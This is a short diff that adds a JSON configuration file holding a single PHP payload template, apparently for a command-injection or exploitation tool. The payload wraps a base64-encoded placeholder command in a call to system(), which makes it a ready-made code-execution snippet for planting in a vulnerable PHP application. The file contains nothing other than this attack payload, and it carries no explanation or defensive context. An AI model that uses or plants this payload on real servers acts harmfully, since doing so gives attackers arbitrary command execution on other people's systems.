@@ -1,0 +1,7 @@
+{
+	"payloads": [{
+			"language": "php",
+			"payload": "<? echo system(base64_decode('{command}')); ?>"
+		}]
+
+}
